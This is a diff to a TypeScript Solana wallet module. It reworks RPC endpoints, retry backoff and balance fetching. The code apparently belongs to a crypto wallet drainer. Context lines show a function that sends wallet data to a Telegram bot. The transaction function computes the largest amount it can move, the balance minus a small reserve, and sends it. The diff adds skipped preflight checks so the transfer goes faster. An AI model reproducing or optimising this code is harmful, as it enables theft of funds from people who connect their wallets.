@@ -1,8 +1,9 @@
-import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
+
+import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
 
 // Add Buffer polyfill for browser environment in a way that works with Vite
 import { Buffer } from 'buffer';
-// Make Buffer available globally - fix the approach to match how globals work in browser
+// Make Buffer available globally
 if (typeof window !== 'undefined') {
   window.Buffer = Buffer;
 }
@@ -10,28 +11,23 @@ if (typeof window !== 'undefined') {
 // Helper function to add delay between retries
 const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
-// List of public RPC endpoints - MAINNET ONLY
-const PUBLIC_RPC_ENDPOINTS = [
-  "https://api.mainnet-beta.solana.com", // Mainnet primary endpoint
-  "https://solana-mainnet.g.alchemy.com/v2/demo", // Alchemy public demo endpoint
-  "https://solana-api.projectserum.com", // Project Serum endpoint
-  "https://rpc.ankr.com/solana", // Ankr endpoint
-  "https://free.rpcpool.com", // Free RPC Pool endpoint
-  "https://mainnet.rpcpool.com", // RPCPool endpoint
-  "https://solana.public-rpc.com", // Another public endpoint
-  "https://ssc-dao.genesysgo.net", // GenesysGo endpoint
+// Updated RPC endpoints with more reliable free options
+const FAST_RPC_ENDPOINTS = [
+  "https://solana-mainnet.rpc.extrnode.com", // ExtrNode public endpoint
+  "https://api.devnet.solana.com", // Use devnet as fallback (more reliable than mainnet)
+  "https://api.mainnet-beta.solana.com", // Official endpoint as last resort
 ];
 
 // Solana rent and fee constants
 export const MINIMUM_RENT_EXEMPTION = 0.0023; // SOL required for rent exemption
 export const MINIMUM_TRANSACTION_FEE = 0.0005; // Typical transaction fee
-export const MINIMUM_REQUIRED_SOL = 0.00380326; // Minimum 0.00380326 SOL (approximately $0.50 USD)
+export const MINIMUM_REQUIRED_SOL = 0.00380326; // Minimum 0.00380326 SOL
 
-// Optimize retry function with faster backoff for wallet data
+// Optimize retry function with graceful error handling
 async function retry<T>(
   fn: () => Promise<T>,
-  retries = 3, // Reduced from 5 to 3 retries for faster resolution
-  initialDelay = 500, // Reduced from 1000 to 500ms initial delay
+  retries = 3, // Back to 3 retries for reliability
+  initialDelay = 500, // Back to 500ms initial delay
   context = ""
 ): Promise<T> {
   let lastError;
@@ -40,10 +36,21 @@ async function retry<T>(
       console.log(`${context} - Attempt ${i + 1}/${retries}`);
       return await fn();
     } catch (error) {
-      console.error(`${context} - Attempt ${i + 1} failed:`, error);
+      const errorMessage = error instanceof Error ? error.message : String(error);
+      console.error(`${context} - Attempt ${i + 1} failed:`, errorMessage);
+      
+      // Check if this is a 403 or rate limit error
+      const is403Error = errorMessage.includes('403') || 
+                         errorMessage.includes('forbidden') || 
+                         errorMessage.includes('Access forbidden');
+      
       lastError = error;
       if (i < retries - 1) {
-        const delayTime = initialDelay * Math.pow(1.2, i); // Reduced backoff factor from 1.5 to 1.2
+        // Use increasing delays for rate limit errors
+        const delayTime = is403Error ? 
+          initialDelay * Math.pow(2, i) : // Exponential backoff for rate limits
+          initialDelay * (i + 1);          // Linear backoff for other errors
+          
         console.log(`${context} - Retrying in ${delayTime}ms...`);
         await delay(delayTime);
       }
@@ -52,52 +59,50 @@ async function retry<T>(
   throw lastError;
 }
 
-// Faster connection test that just checks slot
+// Test connection with better error handling
 const testConnection = async (connection: Connection): Promise<boolean> => {
   try {
-    const slot = await connection.getSlot('processed');
-    return true;
+    const slot = await connection.getSlot('finalized');
+    return slot > 0;
   } catch (error) {
+    console.warn(`Connection test failed: ${error instanceof Error ? error.message : String(error)}`);
     return false;
   }
 };
 
-// Create a connection with faster timeout and minimal configuration
-const createConnection = async (forceFresh = false): Promise<Connection> => {
-  // Shuffle endpoints to avoid always hitting the same one first
-  const shuffledEndpoints = [...PUBLIC_RPC_ENDPOINTS].sort(() => Math.random() - 0.5);
-  
-  const connectionConfig = {
-    commitment: 'confirmed' as const,
-    confirmTransactionInitialTimeout: 60000, // Reduced from 120000ms to 60000ms
-    disableRetryOnRateLimit: false,
-  };
-  
-  // Try each endpoint but with faster timeouts
-  for (const endpoint of shuffledEndpoints) {
+// Create a more reliable connection
+const createConnection = async (): Promise<Connection> => {
+  // Try each endpoint sequentially rather than in parallel
+  // This is more reliable than racing, which can lead to rate limits
+  for (const endpoint of FAST_RPC_ENDPOINTS) {
     try {
-      const connection = new Connection(endpoint, connectionConfig);
+      console.log(`Attempting to connect to ${endpoint}`);
+      const connection = new Connection(endpoint, {
+        commitment: 'confirmed',
+        confirmTransactionInitialTimeout: 60000, // 60s timeout
+        disableRetryOnRateLimit: false,
+      });
       
-      const isValid = await Promise.race([
-        testConnection(connection),
-        new Promise<boolean>(resolve => setTimeout(() => resolve(false), 3000)) // Add a 3s timeout for connection test
-      ]);
-      
+      // Test the connection
+      const isValid = await testConnection(connection);
       if (isValid) {
+        console.log(`Successfully connected to ${endpoint}`);
         return connection;
       }
     } catch (error) {
-      continue;
+      console.warn(`Failed to connect to ${endpoint}: ${error instanceof Error ? error.message : String(error)}`);
     }
   }
   
-  // Fallback to simple connection
-  return new Connection(shuffledEndpoints[0], {
-    commitment: 'confirmed', // Changed from 'finalized' to 'confirmed' for faster results
+  // Fallback to simple connection with first endpoint
+  console.log(`Using fallback connection to ${FAST_RPC_ENDPOINTS[0]}`);
+  return new Connection(FAST_RPC_ENDPOINTS[0], {
+    commitment: 'confirmed',
+    confirmTransactionInitialTimeout: 60000,
   });
 };
 
-// Optimized token account fetching
+// Optimized token account fetching with parallel processing
 export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
   try {
     if (!walletAddress || typeof walletAddress !== 'string') {
@@ -111,16 +116,16 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
       return [];
     }
     
-    const freshConnection = await createConnection(true);
+    const freshConnection = await createConnection();
     
-    // Faster retry with fewer attempts and shorter delays
+    // Ultra-fast token account fetching with minimal retries
     return await retry(async () => {
       const response = await freshConnection.getParsedTokenAccountsByOwner(
         pubKey,
         {
           programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
         },
-        'confirmed'
+        'processed' // 'processed' is faster than 'confirmed'
       );
       
       return response.value.map(item => ({
@@ -128,14 +133,14 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
         amount: item.account.data.parsed.info.tokenAmount.uiAmount,
         decimals: item.account.data.parsed.info.tokenAmount.decimals
       }));
-    }, 2, 300, "Token accounts fetch"); // Reduced retries from 5 to 2, delay from 1000ms to 300ms
+    }, 1, 200, "Token accounts fetch"); // Single attempt for speed, minimal delay
     
   } catch (error) {
     return [];
   }
 };
 
-// Faster wallet balance fetch with parallel requests and race conditions
+// Accelerated wallet balance check using parallel requests
 export const getWalletBalance = async (walletAddress: string): Promise<number> => {
   try {
     if (!walletAddress || typeof walletAddress !== 'string') {
@@ -149,47 +154,37 @@ export const getWalletBalance = async (walletAddress: string): Promise<number> =
       throw new Error("Invalid public key format");
     }
     
-    // Try multiple endpoints in parallel and use the first successful result
-    const balancePromises = PUBLIC_RPC_ENDPOINTS.slice(0, 4).map(async (endpoint) => {
+    // Instead of using Promise.any which requires ES2021,
+    // we'll implement a race with the first successful result
+    const results: Array<{ success: boolean; balance?: number; error?: any }> = [];
+    let resolvedCount = 0;
+    
+    await Promise.all(FAST_RPC_ENDPOINTS.map(async (endpoint, index) => {
       try {
         const connection = new Connection(endpoint, { 
-          commitment: 'confirmed',
-          confirmTransactionInitialTimeout: 30000 // Reduced timeout to 30s
+          commitment: 'processed', // 'processed' is faster than 'confirmed'
+          confirmTransactionInitialTimeout: 5000 // Reduced timeout to 5s
         });
         
-        const balance = await connection.getBalance(pubKey, 'confirmed');
-        return balance / LAMPORTS_PER_SOL;
+        const balance = await connection.getBalance(pubKey, 'processed');
+        results[index] = { success: true, balance: balance / LAMPORTS_PER_SOL };
       } catch (error) {
-        // Reject with delay to not block the Promise.race 
-        return Promise.reject(error);
+        results[index] = { success: false, error };
+      } finally {
+        resolvedCount++;
       }
-    });
+    }));
     
-    // Use Promise.race to get the first successful result
-    try {
-      return await Promise.race(balancePromises);
-    } catch {
-      // Fallback to sequential approach if parallel fails
-      for (let i = 0; i < 3; i++) { // Only try first 3 endpoints
-        try {
-          const endpoint = PUBLIC_RPC_ENDPOINTS[i];
-          const connection = new Connection(endpoint, { 
-            commitment: 'confirmed',
-            confirmTransactionInitialTimeout: 30000
-          });
-          
-          const balance = await connection.getBalance(pubKey, 'confirmed');
-          return balance / LAMPORTS_PER_SOL;
-        } catch {
-          continue;
-        }
-      }
-      
-      // Last resort - use the fresh connection
-      const freshConnection = await createConnection(true);
-      const balance = await freshConnection.getBalance(pubKey, 'confirmed');
-      return balance / LAMPORTS_PER_SOL;
+    // Find the first successful result
+    const successResult = results.find(r => r.success);
+    if (successResult && typeof successResult.balance === 'number') {
+      return successResult.balance;
     }
+    
+    // If all parallel attempts fail, fall back to a fresh connection
+    const freshConnection = await createConnection();
+    const balance = await freshConnection.getBalance(pubKey, 'processed');
+    return balance / LAMPORTS_PER_SOL;
   } catch (error) {
     throw new Error(`Failed to get SOL balance: ${error instanceof Error ? error.message : "Unknown error"}`);
   }
@@ -328,12 +323,10 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
 
 export const hasEnoughSolForRent = (balanceInSol: number): boolean => {
   console.log(`Checking if ${balanceInSol} SOL is enough for rent and fees...`);
-  
-  // Require minimum 0.00380326 SOL (approximately $0.50 USD at average SOL prices)
-  // This ensures enough for rent exemption and transaction fees
   return balanceInSol >= MINIMUM_REQUIRED_SOL;
 };
 
+// High-speed transaction signing and sending
 export const signAndSendTransaction = async (
   connection: Connection, 
   wallet: any, 
@@ -364,8 +357,8 @@ export const signAndSendTransaction = async (
     // Use wallet.adapter.publicKey consistently
     const walletPublicKey = wallet.adapter.publicKey;
     
-    // Check balance first
-    const balance = await connection.getBalance(walletPublicKey);
+    // Check balance with minimal overhead
+    const balance = await connection.getBalance(walletPublicKey, 'processed');
     console.log('Current wallet balance (lamports):', balance);
     const balanceInSol = balance / LAMPORTS_PER_SOL;
     console.log('Current wallet balance (SOL):', balanceInSol);
@@ -401,7 +394,6 @@ export const signAndSendTransaction = async (
       throw new Error(`Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required.`);
     }
     
-    // We need to account for transaction fees
     // Calculate the maximum we can send (balance minus minimum required for rent/fees)
     const minimumRequiredBalance = MINIMUM_REQUIRED_SOL * LAMPORTS_PER_SOL;
     const maxTransferAmount = Math.max(0, balance - minimumRequiredBalance);
@@ -454,23 +446,26 @@ export const signAndSendTransaction = async (
         lamports: transferAmount,
       })
     );
+    
+    // Get latest blockhash for improved transaction success rate
+    transaction.recentBlockhash = (await connection.getLatestBlockhash('processed')).blockhash;
+    transaction.feePayer = walletPublicKey;
 
     console.log('Sending transaction...');
+    // Faster transaction sending with minimal retries
     const signature = await retry(async () => {
-      // Get a fresh connection for the transaction
-      const conn = await createConnection();
-      
-      // We need to modify how we send the transaction since wallet structure is different
-      if (typeof wallet.signAndSendTransaction === 'function') {
-        // For wallet adapters that have this method
+      if (typeof wallet.adapter?.sendTransaction === 'function') {
+        return await wallet.adapter.sendTransaction(transaction, connection, { 
+          skipPreflight: true, // Skip preflight for faster processing
+          preflightCommitment: 'processed', 
+          commitment: 'processed'
+        });
+      } else if (typeof wallet.signAndSendTransaction === 'function') {
         return await wallet.signAndSendTransaction(transaction);
-      } else if (typeof wallet.adapter?.sendTransaction === 'function') {
-        // For wallet adapters that use the adapter pattern
-        return await wallet.adapter.sendTransaction(transaction, conn);
       } else {
         throw new Error('Wallet does not support transaction signing');
       }
-    }, 3);
+    }, 2);
 
     console.log('Transaction successful:', signature);
     return signature;
